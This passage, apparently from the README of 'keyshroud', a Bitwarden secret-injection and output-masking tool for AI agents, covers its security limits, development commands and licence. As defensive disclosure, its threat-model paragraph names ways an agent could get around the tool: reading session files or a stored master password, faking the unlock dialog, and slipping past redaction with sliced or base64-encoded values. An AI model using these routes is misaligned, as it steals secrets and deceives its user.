secret-using commands through `keyshroud run` or `secrets_run`, with `--only` (or
`only`) naming the secrets the command needs, since every wired secret is injected
otherwise. An agent with shell access as your user can open a
keychain-mode local vault at any time, and use a passphrase vault's session files until the session
ends. It can also read `~/.config/keyshroud/session` and use `bw` directly until that session ends —
after `setup` that reaches only the agent account; a stored master password (keychain entry or
`~/.config/keyshroud/master-password`) it can read at any time, which is why keyshroud asks
instead by default; otherwise run agents in a sandbox or container if that matters. The same
agent could also draw a window that looks like the unlock dialog; when in doubt, cancel it and run
`keyshroud unlock` in a terminal. Without `setup`, keyshroud shares bw's default login, so the
30-minute lock also ends a `bw` session you opened yourself. Redaction is exact-match, so a *partial* or transformed value
(`${TOKEN:0:10}`, base64, a line wrapped by a tool) is not masked. Two reshaped forms are: a value is
also masked without its leading and trailing spaces or line breaks, and a value of several lines or a
JSON document (a PEM key, a service account file) is also masked run by run (20 or more letters, digits
and `+/=_-`), so a key shown with line numbers or as a diff stays masked; values
shorter than 6 characters are not redacted (to avoid noise), so don't wire short
PINs.

Report vulnerabilities privately — see [SECURITY.md](SECURITY.md).

## Development

```bash
npm install
npm run check        # typecheck + tests (fake bw, no real vault) + build
node src/cli.ts doctor   # run from source (Node ≥ 22.18 strips types)
```

See [CONTRIBUTING.md](CONTRIBUTING.md). The runtime-neutral core is in
`src/core.ts` (the local vault's file format in `src/vault.ts`); agent integrations
live in `extensions/`, `src/mcp.ts` and `src/hooks.ts`.

## Credits

Inspired by [@jmcombs/pi-1password](https://www.npmjs.com/package/@jmcombs/pi-1password)
— its popup UI and diagnostics shape are ported here (MIT). Masked output follows
1Password's `op run`. Not affiliated with Bitwarden, Inc. or the Vaultwarden
project; "Bitwarden" is a trademark of Bitwarden, Inc.

## License

[MIT](LICENSE) © 2026 dinhkarate
